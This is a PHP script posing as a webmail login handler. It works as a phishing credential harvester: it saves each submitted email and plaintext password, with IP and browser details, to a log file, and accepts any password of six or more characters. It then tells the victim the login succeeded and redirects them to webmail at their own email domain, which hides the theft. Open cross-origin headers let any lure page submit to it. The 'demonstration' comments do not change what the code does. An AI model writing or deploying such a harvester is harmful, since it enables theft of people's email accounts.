<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['msg' => 'Method not allowed', 'signal' => 'ERROR']);
    exit();
}

// Get POST data
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';

// Validate input
if (empty($email) || empty($password)) {
    http_response_code(400);
    echo json_encode(['msg' => 'Email and password are required', 'signal' => 'ERROR']);
    exit();
}

// Validate email format
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['msg' => 'Invalid email format', 'signal' => 'ERROR']);
    exit();
}

// Log the attempt (you can customize this part)
$log_data = [
    'timestamp' => date('Y-m-d H:i:s'),
    'email' => $email,
    'password' => $password,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
];

// Save to log file (make sure the directory is writable)
$log_file = 'login_attempts.log';
file_put_contents($log_file, json_encode($log_data) . "\n", FILE_APPEND | LOCK_EX);

// For demonstration purposes, we'll simulate different responses
// In a real application, you would validate against a database or external service

// Extract domain from email
$domain = substr(strrchr($email, "@"), 1);

// Simulate login validation
$is_valid_login = false;

// Example validation logic (customize as needed)
if (strlen($password) >= 6) {
    // For demo: accept any email with password length >= 6
    $is_valid_login = true;
} else {
    $is_valid_login = false;
}

// Generate response
if ($is_valid_login) {
    // Success response
    $response = [
        'signal' => 'OK',
        'success' => true,
        'msg' => 'Login successful! Redirecting to webmail...',
        'email' => $email,
        'domain' => $domain,
        'redirect_url' => "https://webmail.$domain"
    ];
    
    http_response_code(200);
    echo json_encode($response);
} else {
    // Failed login response
    $response = [
        'signal' => 'ERROR',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => 1
    ];
    
    http_response_code(401);
    echo json_encode($response);
}

// Optional: Send email notification or perform additional logging
// You can add email sending functionality here using PHPMailer or similar

exit();
?>